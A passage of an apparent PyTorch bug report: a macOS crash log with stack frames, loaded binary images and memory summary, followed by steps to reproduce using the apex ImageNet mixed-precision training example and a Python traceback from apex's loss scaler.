36 libtorch_cpu.dylib c10::detail::wrap_kernel_functor_unboxed_<c10::detail::wrapruntimekernelfunctor_<at::tensor (*)(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long), at::tensor, c10::guts::typelist::typelist<at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long> >, at::tensor (at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long)>::call(c10::operatorkernel*, at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) + 85
37 libtorch_python.dylib at::tensor c10::operatorhandle::callunboxed<at::tensor, at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long>(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long long>, c10::arrayref<long long>, c10::arrayref<long long>, long long) const + 515
38 libtorch_python.dylib torch::autograd::thpvariable_conv2d(_object*, _object*, _object*) + 1149
39 python _pymethoddef_rawfastcallkeywords + 642
40 python call_function + 306
41 python _pyeval_evalframedefault + 46334
42 python _pyeval_evalcodewithname + 410
43 python pyrun_fileexflags + 256
44 python pyrun_simplefileexflags + 391
45 python pymain_main + 9711
46 python main + 125
47 libdyld.dylib start + 1 thread 0 crashed with x86 thread state (64-bit): rax: rbx: rcx: rdx: rdi: rsi: rbp: rsp: r8: r9: r10: r11: r12: r13: r14: r15: rip: rfl: cr2: logical cpu: 4
error code: (no mapping for user data write)
trap number: 14 binary images: - +python (0) <6630a34d-c116-3833-b8e2-4d959ef186aa> /users/user/*/python - +_heapq.cpython-37m-darwin.so (0) <da70bc51-7ee3-310e-b595-34c73b99a2b7> /users/user/*/_heapq.cpython-37m-darwin.so - +_multiarray_umath.cpython-37m-darwin.so (0) <c573da1e-a924-307a-bd02-ee31f8d0d39b> /users/user/*/_multiarray_umath.cpython-37m-darwin.so - +libmkl_rt.dylib (0) <78fa54fd-7231-3adf-a277-cb558d1c4f2b> /users/user/*/libmkl_rt.dylib - +math.cpython-37m-darwin.so (0) <75cb4abf-9838-389c-8455-02c9d9d7e531> /users/user/*/math.cpython-37m-darwin.so - +_datetime.cpython-37m-darwin.so (0) <7feab1bd-9583-3338-b423-8574afb0e9ea> /users/user/*/_datetime.cpython-37m-darwin.so - +_struct.cpython-37m-darwin.so (0) <38f3144d-00ee-33fa-b0b6-147f09db901d> /users/user/*/_struct.cpython-37m-darwin.so - +_pickle.cpython-37m-darwin.so (0) <5365127a-52f5-356b-b637-d6f2e350a813> /users/user/*/_pickle.cpython-37m-darwin.so - +_multiarray_tests.cpython-37m-darwin.so (0) <de64bb13-8f5d-3977-a327-dc005a6fa446> /users/user/*/_multiarray_tests.cpython-37m-darwin.so - +_ctypes.cpython-37m-darwin.so (0) <66269fd6-56f9-32a5-8a25-f986023901a1> /users/user/*/_ctypes.cpython-37m-darwin.so - +libffi.6.dylib (0) <22d0ae69-2280-39f6-a06f-481e4164e735> /users/user/*/libffi.6.dylib - +_posixsubprocess.cpython-37m-darwin.so (0) <a29df2a4-ecde-315a-9dba-98941cfd9510> /users/user/*/_posixsubprocess.cpython-37m-darwin.so - +select.cpython-37m-darwin.so (0) <c9f0dc8e-9e64-37a7-9b8b-51db08a64c69> /users/user/*/select.cpython-37m-darwin.so - +lapack_lite.cpython-37m-darwin.so (0) <2b351101-9d99-3d75-89a0-89d447fbb115> /users/user/*/lapack_lite.cpython-37m-darwin.so - +_umath_linalg.cpython-37m-darwin.so (0) <93fc4270-5ae1-33e9-ada4-e450e6e36b26> /users/user/*/_umath_linalg.cpython-37m-darwin.so - +zlib.cpython-37m-darwin.so (0) <19edef28-0886-3049-8319-638a2c219c2f> /users/user/*/zlib.cpython-37m-darwin.so - +libz.1.2.11.dylib (0) <f78a9157-ae4d-3aa0-8f75-508ec11aa446> /users/user/*/libz.1.2.11.dylib - +_bz2.cpython-37m-darwin.so (0) <cafdab42-74fe-3683-aaae-50ed4ffb78dd> /users/user/*/_bz2.cpython-37m-darwin.so - +_lzma.cpython-37m-darwin.so (0) <e3e42df6-2725-3da5-9fca-577dbea0715c> /users/user/*/_lzma.cpython-37m-darwin.so - +liblzma.5.dylib (0) <80299d86-7cb4-3ee8-9193-ad9027f0cd27> /users/user/*/liblzma.5.dylib - +grp.cpython-37m-darwin.so (0) <de699553-4512-38e5-a7fa-44bab8bc0811> /users/user/*/grp.cpython-37m-darwin.so - +_decimal.cpython-37m-darwin.so (0) <aa2d7466-3184-3867-a45e-be4476fb9afc> /users/user/*/_decimal.cpython-37m-darwin.so - +_pocketfft_internal.cpython-37m-darwin.so (0) <cae086cd-3a6f-32e6-a1f6-d1c830b5644a> /users/user/*/_pocketfft_internal.cpython-37m-darwin.so - +mtrand.cpython-37m-darwin.so (0) <f60e6414-e9cd-3d41-beb7-3e07e3599262> /users/user/*/mtrand.cpython-37m-darwin.so - +_bit_generator.cpython-37m-darwin.so (0) <1b0312b8-be47-3596-b241-2c5d69d4f98c> /users/user/*/_bit_generator.cpython-37m-darwin.so - +_common.cpython-37m-darwin.so (0) <a579e0a0-70cc-3d1b-94a6-1b25bb7d32c2> /users/user/*/_common.cpython-37m-darwin.so - +binascii.cpython-37m-darwin.so (0) <7642accf-2ee8-3470-9567-13051891e3c2> /users/user/*/binascii.cpython-37m-darwin.so - +_hashlib.cpython-37m-darwin.so (0) <f48ec116-4c5a-32e4-b1d1-a89f55398449> /users/user/*/_hashlib.cpython-37m-darwin.so - +libcrypto.1.1.dylib (0) <6f5db370-615a-3737-aa60-8d6b3b27c397> /users/user/*/libcrypto.1.1.dylib - +_blake2.cpython-37m-darwin.so (0) <77b9d30a-c343-32cc-ab8a-8a80c57d2e83> /users/user/*/_blake2.cpython-37m-darwin.so - +_sha3.cpython-37m-darwin.so (0) <e146cd37-dd13-30c1-b697-375f38fa523d> /users/user/*/_sha3.cpython-37m-darwin.so - +_bisect.cpython-37m-darwin.so (0) <25f1d157-8d0a-3d95-b44e-78bed32972e8> /users/user/*/_bisect.cpython-37m-darwin.so - +_random.cpython-37m-darwin.so (0) <aa0d17b7-a63b-3234-b653-fedd995dd7a6> /users/user/*/_random.cpython-37m-darwin.so - +_bounded_integers.cpython-37m-darwin.so (0) <d204e670-cf39-3c18-a5e3-ab5127791536> /users/user/*/_bounded_integers.cpython-37m-darwin.so - +_mt19937.cpython-37m-darwin.so (0) <95e043ad-1220-39da-a824-11634d3ad42a> /users/user/*/_mt19937.cpython-37m-darwin.so - +_philox.cpython-37m-darwin.so (0) <df2d4d60-cff3-314f-92a4-fa1068784987> /users/user/*/_philox.cpython-37m-darwin.so - +_pcg64.cpython-37m-darwin.so (0) <19af15ec-5abe-35cf-8c31-218503229139> /users/user/*/_pcg64.cpython-37m-darwin.so - +_sfc64.cpython-37m-darwin.so (0) <030ec799-c361-3150-8f88-e50808172991> /users/user/*/_sfc64.cpython-37m-darwin.so - +_generator.cpython-37m-darwin.so (0) <f9a6f427-fa23-305a-a7aa-afc9998b5a7c> /users/user/*/_generator.cpython-37m-darwin.so - +libmkl_core.dylib (0) <4e843307-4d4a-3350-873e-2f7a7e48c9ab> /users/user/*/libmkl_core.dylib - +libomp.dylib (0) <48576612-0c13-38c2-a665-5db381336002> /users/user/*/libomp.dylib - +libmkl_intel_thread.dylib (0) <7ebcb280-00b2-38d3-b676-1d1f675881b3> /users/user/*/libmkl_intel_thread.dylib - +libmkl_intel_lp64.dylib (0) <c7e1f9e4-f694-3cc3-a327-d2d47b0e3414> /users/user/*/libmkl_intel_lp64.dylib - +libmkl_avx2.dylib (0) <4bc97cfd-f080-39fc-b7ba-26ac6974ac12> /users/user/*/libmkl_avx2.dylib - +libmkl_vml_avx2.dylib (0) <c4af13dd-ffd2-3385-819b-8a045e5d0672> /users/user/*/libmkl_vml_avx2.dylib - +_opcode.cpython-37m-darwin.so (0) <26eeed10-a7e5-3b30-b8f3-bec98dee9107> /users/user/*/_opcode.cpython-37m-darwin.so - +_queue.cpython-37m-darwin.so (0) <a648a9af-8a92-366b-8277-e1aee511c432> /users/user/*/_queue.cpython-37m-darwin.so - +libtorch_global_deps.dylib (0) <3c1d0fd7-170e-372e-aec8-457c24835f83> /users/user/*/libtorch_global_deps.dylib - +_c.cpython-37m-darwin.so (0) <814aa3a4-00d1-395c-a858-b25e69b8ebaa> /users/user/*/_c.cpython-37m-darwin.so - +libshm.dylib (0) <9634a57b-36c3-3dcb-be8a-835a7181c9b3> /users/user/*/libshm.dylib - +libc++.1.0.dylib (0) <6518e2d6-4a37-31d8-9f94-4d27e233bc17> /users/user/*/libc++.1.0.dylib - +libtorch.dylib (0) <0e7290fb-4fcd-3112-98a7-71ecd75e5bbe> /users/user/*/libtorch.dylib - +libc10.dylib (0) <4249e685-5a4b-30aa-b799-ed20624890cc> /users/user/*/libc10.dylib - +_socket.cpython-37m-darwin.so (0) <6e3deb39-8a1e-37a7-879b-aa5ab211295c> /users/user/*/_socket.cpython-37m-darwin.so - +array.cpython-37m-darwin.so (0) <d875a97a-ac61-36ce-9ca6-690347947912> /users/user/*/array.cpython-37m-darwin.so - +_multiprocessing.cpython-37m-darwin.so (0) <201ae99f-9963-3e26-86b7-38f6acbf52f2> /users/user/*/_multiprocessing.cpython-37m-darwin.so - +_ssl.cpython-37m-darwin.so (0) <1204f417-1154-3878-ae0f-d1791f8bef63> /users/user/*/_ssl.cpython-37m-darwin.so - +libssl.1.1.dylib (0) <6853c101-b387-3ddf-9187-15267b90b292> /users/user/*/libssl.1.1.dylib - +_scproxy.cpython-37m-darwin.so (0) <c9416e51-303b-3c58-9a46-3e2c5aec77fc> /users/user/*/_scproxy.cpython-37m-darwin.so - dyld (750.5) <e4698fbd-806a-3396-b279-e685ba37430b> /usr/lib/dyld - +libtorch_python.dylib (0) <0e64262e-9ce3-3710-9eb7-20715bb8c9bb> /users/user/*/libtorch_python.dylib - +libtorch_cpu.dylib (0) <906425f3-c65e-3ef0-9852-461f65e97752> /users/user/*/libtorch_cpu.dylib - com.apple.accelerate (1.11 - accelerate 1.11) <56dff715-6a4e-3231-bdcc-a348bcb05047> /system/library/frameworks/accelerate.framework/versions/a/accelerate - com.apple.vimage (8.1 - 524.2.1) <17c93ab9-1625-3fdb-9851-c5e77bbe3428> /system/library/frameworks/accelerate.framework/versions/a/frameworks/vimage.framework/versions/a/vimage - libblas.dylib (1303.60.1) <cbc28be4-3c78-3aed-9565-0d625251d121> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libblas.dylib - libbnns.dylib (144.100.2) <8d653678-1f9b-3670-aae2-46dfb8d37643> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libbnns.dylib - liblapack.dylib (1303.60.1) <f8e9d081-7c60-32ec-a47d-2d30cad73c5f> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/liblapack.dylib - liblinearalgebra.dylib (1303.60.1) <d2c1acea-2b6a-339a-9eeb-62a76cc92cbe> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/liblinearalgebra.dylib - libquadrature.dylib (7) <3112c977-8306-3190-8313-01a952b7f3cf> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libquadrature.dylib - libsparse.dylib (103) <40510bf9-99a7-3155-a81d-6de5a0c73edc> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libsparse.dylib - libsparseblas.dylib (1303.60.1) <3c1066ab-20d5-38d2-b1f2-70a03de76d0b> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libsparseblas.dylib - libvdsp.dylib (735.121.1) <74702e2e-ed05-3765-b18c-64beff62b517> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libvdsp.dylib - libvmisc.dylib (735.121.1) <137558bf-503d-3a6e-96dc-a181e3fb31ff> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libvmisc.dylib - com.apple.accelerate.veclib (3.11 - veclib 3.11) <d7e8e400-35c8-3174-9956-8d1b483620da> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/veclib - com.apple.cfnetwork (1126 - 1126) <bb8f4c63-10b8-3acd-84cf-d4dcfa9245dd> /system/library/frameworks/cfnetwork.framework/versions/a/cfnetwork - com.apple.corefoundation (6.9 - 1676.105) <6af8b3cc-bc3f-3869-b9fb-1d881422364e> /system/library/frameworks/corefoundation.framework/versions/a/corefoundation - com.apple.coreservices (1069.24 - 1069.24) <d9f6ab40-10ec-3682-a969-85560e2e4768> /system/library/frameworks/coreservices.framework/versions/a/coreservices - com.apple.ae (838.1 - 838.1) <5f26da9b-fb2e-3af8-964b-63bd6671cf12> /system/library/frameworks/coreservices.framework/versions/a/frameworks/ae.framework/versions/a/ae - com.apple.coreservices.carboncore (1217 - 1217) <8022af47-aa99-3786-b086-141d84f00387> /system/library/frameworks/coreservices.framework/versions/a/frameworks/carboncore.framework/versions/a/carboncore - com.apple.dictionaryservices (1.2 - 323.6) <c0f3830c-a4c6-3046-9a6a-de1b5d448c2c> /system/library/frameworks/coreservices.framework/versions/a/frameworks/dictionaryservices.framework/versions/a/dictionaryservices - com.apple.coreservices.fsevents (1268.100.1 - 1268.100.1) <e4b2caf2-1203-335f-9971-1278cb6e2ae0> /system/library/frameworks/coreservices.framework/versions/a/frameworks/fsevents.framework/versions/a/fsevents - com.apple.launchservices (1069.24 - 1069.24) <2e0ad228-b1cc-3645-91ee-eb7f46f2147b> /system/library/frameworks/coreservices.framework/versions/a/frameworks/launchservices.framework/versions/a/launchservices - com.apple.metadata (10.7.0 - 2076.6) <c8034e84-7dd4-34b9-9cdf-16a05032ff39> /system/library/frameworks/coreservices.framework/versions/a/frameworks/metadata.framework/versions/a/metadata - com.apple.coreservices.osservices (1069.24 - 1069.24) <72fdea52-7607-3745-ac43-630d80962099> /system/library/frameworks/coreservices.framework/versions/a/frameworks/osservices.framework/versions/a/osservices - com.apple.searchkit (1.4.1 - 1.4.1) <086eb5df-a2ec-3342-8028-ca7996be5cb2> /system/library/frameworks/coreservices.framework/versions/a/frameworks/searchkit.framework/versions/a/searchkit - com.apple.coreservices.sharedfilelist (131.4 - 131.4) <ae333da2-c279-3751-8c15-b963e58ee61e> /system/library/frameworks/coreservices.framework/versions/a/frameworks/sharedfilelist.framework/versions/a/sharedfilelist - com.apple.diskarbitration (2.7 - 2.7) <52e7d181-2a18-37cd-b24f-aa32e93f7a69> /system/library/frameworks/diskarbitration.framework/versions/a/diskarbitration - com.apple.foundation (6.9 - 1676.105) <1fa28bab-7296-3a09-8e1e-e62a7d233db8> /system/library/frameworks/foundation.framework/versions/c/foundation - com.apple.framework.iokit (2.0.2 - 1726.121.1) <a0f54725-036f-3279-a46e-c2abdbfd479b> /system/library/frameworks/iokit.framework/versions/a/iokit - com.apple.netfs (6.0 - 4.0) <ac74e6a4-6e9b-3ab1-9577-8277f8a3ede0> /system/library/frameworks/netfs.framework/versions/a/netfs - com.apple.cfopendirectory (10.15 - 220.40.1) <bfc32ebe-d95c-3267-b95c-5ceefd189ea6> /system/library/frameworks/opendirectory.framework/versions/a/frameworks/cfopendirectory.framework/versions/a/cfopendirectory - com.apple.opendirectory (10.15 - 220.40.1) <76a20bba-775f-3e17-ab0f-fedfcdce0716> /system/library/frameworks/opendirectory.framework/versions/a/opendirectory - com.apple.security (7.0 - 59306.120.7) <aea33464-1507-36f1-8cae-a86eb787f9b5> /system/library/frameworks/security.framework/versions/a/security - com.apple.securityfoundation (6.0 - 55236.60.1) <79289fe1-cb5f-3bef-a33f-11a29a93a681> /system/library/frameworks/securityfoundation.framework/versions/a/securityfoundation - com.apple.xpc.servicemanagement (1.0 - 1) <4194d29d-f0d4-33f8-839a-d03c6c62d8db> /system/library/frameworks/servicemanagement.framework/versions/a/servicemanagement - com.apple.systemconfiguration (1.19 - 1.19) <0cf8726a-be41-3e07-b895-fbc44b75450e> /system/library/frameworks/systemconfiguration.framework/versions/a/systemconfiguration - com.apple.apfs (1412.120.2 - 1412.120.2) <1e8fd511-fdc4-31a2-acde-eb5192032bc6> /system/library/privateframeworks/apfs.framework/versions/a/apfs - com.apple.applefscompression (119.100.1 - 1.0) <2e75cf51-b693-3275-9a4f-40571d48745e> /system/library/privateframeworks/applefscompression.framework/versions/a/applefscompression - com.apple.coreservices.backgroundtaskmanagement (1.0 - 104) <f070f440-27ab-3fcf-9602-f278c332ca01> /system/library/privateframeworks/backgroundtaskmanagement.framework/versions/a/backgroundtaskmanagement - com.apple.coreemoji (1.0 - 107.1) <cdccb4b0-b98f-38e8-9568-c81320e756eb> /system/library/privateframeworks/coreemoji.framework/versions/a/coreemoji - com.apple.corenlp (1.0 - 213) <40fc46d2-844c-3282-a8e4-69dd827f05c5> /system/library/privateframeworks/corenlp.framework/versions/a/corenlp - com.apple.csstore (1069.24 - 1069.24) <c96e5ce8-d604-3f13-b079-b2ba33b90081> /system/library/privateframeworks/coreservicesstore.framework/versions/a/coreservicesstore - com.apple.languagemodeling (1.0 - 215.1) <a6faa215-9a01-3ee1-b304-2238801c5883> /system/library/privateframeworks/languagemodeling.framework/versions/a/languagemodeling - com.apple.lexicon-framework (1.0 - 72) <6ae1872c-0352-36fe-90cc-7303f13a5bef> /system/library/privateframeworks/lexicon.framework/versions/a/lexicon - com.apple.linguisticdata (1.0 - 353.18) <686e7b7c-640f-3d7b-a9c1-31e2dfacd457> /system/library/privateframeworks/linguisticdata.framework/versions/a/linguisticdata - com.apple.spotlight.metadata.utilities (1.0 - 2076.6) <c3aea22d-1feb-3e38-9821-1fa447c8af9d> /system/library/privateframeworks/metadatautilities.framework/versions/a/metadatautilities - com.apple.netauth (6.2 - 6.2) <d660f2cb-5a49-3dd0-9db3-86ef0797828c> /system/library/privateframeworks/netauth.framework/versions/a/netauth - com.apple.tcc (1.0 - 1) <fd146b21-6dc0-3b66-bb95-57a5016b1365> /system/library/privateframeworks/tcc.framework/versions/a/tcc - com.apple.loginsupport (1.0 - 1) <31f02734-1ecf-37d9-9df6-7c3bc3a324fe> /system/library/privateframeworks/login.framework/versions/a/frameworks/loginsupport.framework/versions/a/loginsupport - libcrfsuite.dylib (48) <02c52318-c537-3fd8-bbc4-e5bd25430652> /usr/lib/libcrfsuite.dylib - libchinesetokenizer.dylib (34) <04a7cb5a-fd68-398a-a206-33a510c115e7> /usr/lib/libchinesetokenizer.dylib - libdiagnosticmessagesclient.dylib (112) <27220e98-6ce2-33e3-bd48-3cc3ce4aa036> /usr/lib/libdiagnosticmessagesclient.dylib - libsystem.b.dylib (1281.100.1) <b6fda8a9-3d2b-3bd5-b5b0-57d311c0ff3d> /usr/lib/libsystem.b.dylib - libthaitokenizer.dylib (3) <97dc10ed-3c11-3c89-b366-299a644035e7> /usr/lib/libthaitokenizer.dylib - libapple_nghttp2.dylib (1.39.2) <b99d7150-d4e2-31a2-a594-36da4b90d558> /usr/lib/libapple_nghttp2.dylib - libarchive.2.dylib (72.100.1) <20b70252-0c4b-3afd-8c8d-f51921e9d324> /usr/lib/libarchive.2.dylib - libauto.dylib (187) <85383e24-1592-36bc-bb39-308b7f1c826e> /usr/lib/libauto.dylib - libbsm.0.dylib (60.100.1) <b2331e11-3cbb-3bcf-93a6-12627ae444d0> /usr/lib/libbsm.0.dylib - libbz2.1.0.dylib (44) <bf40e193-8856-39b7-98f8-7a17b328b1e9> /usr/lib/libbz2.1.0.dylib - libc++.1.dylib (902.1) <ad0805fe-f98b-3e2f-b072-83782b22dac9> /usr/lib/libc++.1.dylib - libc++abi.dylib (902) <771e9263-e832-3985-9477-8f1b2d73b771> /usr/lib/libc++abi.dylib - libcharset.1.dylib (59) <ff23d4ed-a5ad-3592-9574-48486c7df85b> /usr/lib/libcharset.1.dylib - libcmph.dylib (8) <296a51e6-9661-3ac2-a1c9-f1e3510f91aa> /usr/lib/libcmph.dylib - libcompression.dylib (87) <21f37c2e-b9aa-38ce-9023-b763c8828ac6> /usr/lib/libcompression.dylib - libcoretls.dylib (167) <9e5d1e0c-03f8-37b6-82a1-0d0597021cb8> /usr/lib/libcoretls.dylib - libcoretls_cfhelpers.dylib (167) <c23be09b-85d1-3744-9e7b-e2b11acd5442> /usr/lib/libcoretls_cfhelpers.dylib - libenergytrace.dylib (21) <dbf8bdee-7229-3f06-ac10-a28dcc4243c0> /usr/lib/libenergytrace.dylib - libfakelink.dylib (149.1) <122f530f-f10e-3dd5-bbea-91796be583f3> /usr/lib/libfakelink.dylib - libgermantok.dylib (24) <dd279bf6-e906-30d3-a69e-dc797e95f147> /usr/lib/libgermantok.dylib - libiconv.2.dylib (59) <f58fed71-6cca-30e8-9a51-13e9b46e568d> /usr/lib/libiconv.2.dylib - libicucore.a.dylib (64260.0.1) <7b9204ac-ea14-3ff3-b6b9-4c85b37eed79> /usr/lib/libicucore.a.dylib - liblangid.dylib (133) <36581d30-1c7b-3a58-aa07-36237bd75e0e> /usr/lib/liblangid.dylib - liblzma.5.dylib (16) <4db30730-dbd1-3503-957a-d604049b98f9> /usr/lib/liblzma.5.dylib - libmecab.dylib (883.11) <66ad729b-2bcc-3347-b9b3-fd88570e884d> /usr/lib/libmecab.dylib - libmecabra.dylib (883.11) <2ae744d2-ac95-3720-8e66-4f9c7a79384c> /usr/lib/libmecabra.dylib - libnetwork.dylib (1880.120.4) <715fb943-ba01-351c-bea6-121970472985> /usr/lib/libnetwork.dylib - libobjc.a.dylib (787.1) <ca836d3e-4595-33f1-b70c-7e39a3fbbe16> /usr/lib/libobjc.a.dylib - libpam.2.dylib (25.100.1) <732e8d8e-c630-3ec2-b6c3-a1564e3b68b8> /usr/lib/libpam.2.dylib - libpcap.a.dylib (89.120.1) <cf2adf15-2d44-3a35-94b4-dd24052f9b23> /usr/lib/libpcap.a.dylib - libsqlite3.dylib (308.5) <af518115-4ad1-39f2-9b82-e2640e2221e1> /usr/lib/libsqlite3.dylib - libutil.dylib (57) <d33b63d2-adc2-38bd-b8f2-24056c41e07b> /usr/lib/libutil.dylib - libxar.1.dylib (425.2) <943a4cbb-331b-3a04-a11f-a2301189d40b> /usr/lib/libxar.1.dylib - libxml2.2.dylib (33.3) <262ef7c6-7d83-3c01-863f-36e97f5acd34> /usr/lib/libxml2.2.dylib - libxslt.1.dylib (16.9) <86fe4382-bd77-3c19-a678-11ebcd70685a> /usr/lib/libxslt.1.dylib - libz.1.dylib (76) <db120508-3bed-37a8-b439-5235eab4618a> /usr/lib/libz.1.dylib - libcache.dylib (83) <a5ecc751-a681-30d8-b33c-d192c15d25c8> /usr/lib/system/libcache.dylib - libcommoncrypto.dylib (60165.120.1) <c321a74a-aa91-3785-bebf-bedc6975026c> /usr/lib/system/libcommoncrypto.dylib - libcompiler_rt.dylib (101.2) <652a6012-7e5c-3f4f-9438-86bc094526f3> /usr/lib/system/libcompiler_rt.dylib - libcopyfile.dylib (166.40.1) <40113a69-a81c-3397-adc6-1d16b9a22c3e> /usr/lib/system/libcopyfile.dylib - libcorecrypto.dylib (866.120.3) <5e4b0e50-24dd-3e04-9374-eda9ffd6257b> /usr/lib/system/libcorecrypto.dylib - libdispatch.dylib (1173.100.2) <201edbf3-0b36-31ba-a7cb-443ce35c05d4> /usr/lib/system/libdispatch.dylib - libdyld.dylib (750.5) <7e711a46-5e4d-393c-aea6-440e2a5ccd0c> /usr/lib/system/libdyld.dylib - libkeymgr.dylib (30) <52662caa-db1f-30a3-be13-d6274b1a6d7b> /usr/lib/system/libkeymgr.dylib - libkxld.dylib (6153.121.2) <5ebb4886-c7b6-31d6-aa63-d861b2d58fce> /usr/lib/system/libkxld.dylib - liblaunch.dylib (1738.120.8) <07cf647b-f9dc-3907-ad98-2f85fcb34a72> /usr/lib/system/liblaunch.dylib - libmacho.dylib (959.0.1) <d91dff00-e22f-3796-8a1c-4c1f5f8fa03c> /usr/lib/system/libmacho.dylib - libquarantine.dylib (110.40.3) <d3b7d02c-7646-3fb4-8529-b36dcc2419ea> /usr/lib/system/libquarantine.dylib - libremovefile.dylib (48) <b5e88d9b-c2be-3496-bbb2-c996317e18a3> /usr/lib/system/libremovefile.dylib - libsystem_asl.dylib (377.60.2) <1170348d-2491-33f1-aa79-e2a05b4a287c> /usr/lib/system/libsystem_asl.dylib - libsystem_blocks.dylib (74) <7afbcaa6-81be-36c3-8db0-aae0a4ace4c5> /usr/lib/system/libsystem_blocks.dylib - libsystem_c.dylib (1353.100.2) <935ddce9-4ed0-3f79-a05a-a123dde399cc> /usr/lib/system/libsystem_c.dylib - libsystem_configuration.dylib (1061.120.2) <ea9bc2b1-5001-3463-9faf-39ff61cac87c> /usr/lib/system/libsystem_configuration.dylib - libsystem_coreservices.dylib (114) <3d0a3aa8-8415-37b2-aae3-66c03bce8b55> /usr/lib/system/libsystem_coreservices.dylib - libsystem_darwin.dylib (1353.100.2) <6eec9975-ee3b-3c95-aa5b-030fd10587bc> /usr/lib/system/libsystem_darwin.dylib - libsystem_dnssd.dylib (1096.100.3) <0115092a-e61b-317d-8670-41c7c34b1a82> /usr/lib/system/libsystem_dnssd.dylib - libsystem_featureflags.dylib (17) <afdb5095-0472-34ac-ba7e-497921bf030a> /usr/lib/system/libsystem_featureflags.dylib - libsystem_info.dylib (538) <851693e9-c079-3547-ad41-353f8c248be8> /usr/lib/system/libsystem_info.dylib - libsystem_kernel.dylib (6153.121.2) <9f9902c9-a46f-3ca9-b7f9-5ccfe98fbf75> /usr/lib/system/libsystem_kernel.dylib - libsystem_m.dylib (3178) <436cff76-6a99-36f2-a3b6-8d017396a050> /usr/lib/system/libsystem_m.dylib - libsystem_malloc.dylib (283.100.6) <d4ba7df2-57ac-33b0-b948-a688ee43c799> /usr/lib/system/libsystem_malloc.dylib - libsystem_networkextension.dylib (1095.120.6) <6de86db0-8cd2-361e-bd6a-a34282b47847> /usr/lib/system/libsystem_networkextension.dylib - libsystem_notify.dylib (241.100.2) <7e9e2fc8-df26-340c-b196-b81b11850c46> /usr/lib/system/libsystem_notify.dylib - libsystem_platform.dylib (220.100.1) <736920ea-6ae0-3b1b-bbda-7dcdf0c229df> /usr/lib/system/libsystem_platform.dylib - libsystem_pthread.dylib (416.100.3) <77488669-19a3-3993-ad65-ca5377e2475a> /usr/lib/system/libsystem_pthread.dylib - libsystem_sandbox.dylib (1217.120.7) <20c93d69-6452-3c82-9521-8ae54345c66f> /usr/lib/system/libsystem_sandbox.dylib - libsystem_secinit.dylib (62.100.2) <e851113d-d5b1-3fb0-9d29-9c7647a71961> /usr/lib/system/libsystem_secinit.dylib - libsystem_symptoms.dylib (1238.120.1) <25c3866b-004e-3621-9cd3-b1e9c4d887eb> /usr/lib/system/libsystem_symptoms.dylib - libsystem_trace.dylib (1147.120) <a1ed1d3a-5fad-3559-a1d6-1be4e1c5756a> /usr/lib/system/libsystem_trace.dylib - libunwind.dylib (35.4) <253a12e2-f88f-3838-a666-c5306f833cb8> /usr/lib/system/libunwind.dylib - libxpc.dylib (1738.120.8) <68d433b6-dcff-385d-8620-f847fb7d4a5a> /usr/lib/system/libxpc.dylib external modification summary: calls made by other processes targeting this process: task_for_pid: 1 thread_create: 0 thread_set_state: 0 calls made by this process: task_for_pid: 0 thread_create: 0 thread_set_state: 0 calls made by all processes on this machine: task_for_pid: 1005859 thread_create: 0 thread_set_state: 0 vm region summary:
readonly portion of libraries: total=788.4m resident=0k(0%) swapped_out_or_unallocated=788.4m(100%)
writable regions: total=41.7g written=0k(0%) resident=0k(0%) swapped_out=0k(0%) unallocated=41.7g(100%) virtual region region type size count (non-coalesced) =========== ======= ======= activity tracing 256k 1 kernel alloc once 8k 1 malloc 8.2g 104 malloc guard page 24k 5 malloc_large (reserved) 32.7g 1 reserved vm address space (unallocated)
malloc_medium (reserved) 832.0m 7 reserved vm address space (unallocated)
stack guard 4k 1 stack 16.0m 1 vm_allocate 1028k 5 __data 12.9m 197 __data_const 20k 1 __linkedit 432.7m 63 __objc_ro 32.2m 1 __objc_rw 1892k 2 __text 355.7m 180 __unicode 564k 1 shared memory 12k 3 =========== ======= ======= total 42.5g 574 total, minus reserved vm space 9.0g 574
steps to reproduce the behavior: use the apex imagenet example: python -m torch.distributed.launch --nproc_per_node=2 main_amp.py -a=mnasnet1_3 --b 224 --workers 4 --channels-last=true --opt-level=o1 -b=256 /intel_nvme/imagenet_data/
traceback (most recent call last): file "main_amp.py", line 542, in <module> main() file "main_amp.py", line 247, in main train(train_loader, model, criterion, optimizer, epoch) file "main_amp.py", line 353, in train scaled_loss.backward() file "/home/tstand/anaconda3/lib/python3.7/contextlib.py", line 119, in __exit__ next(self.gen) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/handle.py", line 123, in scale_loss optimizer._post_amp_backward(loss_scaler) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/_process_optimizer.py", line 249, in post_backward_no_master_weights post_backward_models_are_masters(scaler, params, stashed_grads) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/_process_optimizer.py", line 135, in post_backward_models_are_masters scale_override=(grads_have_scale, stashed_have_scale, out_scale)) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/scaler.py", line 184, in unscale_with_stashed out_scale/stashed_have_scale) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/scaler.py", line 148, in unscale_with_stashed_python self.dynamic) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/scaler.py", line 22, in axpby_check_overflow_python cpu_sum = float(model_grad.float().sum())
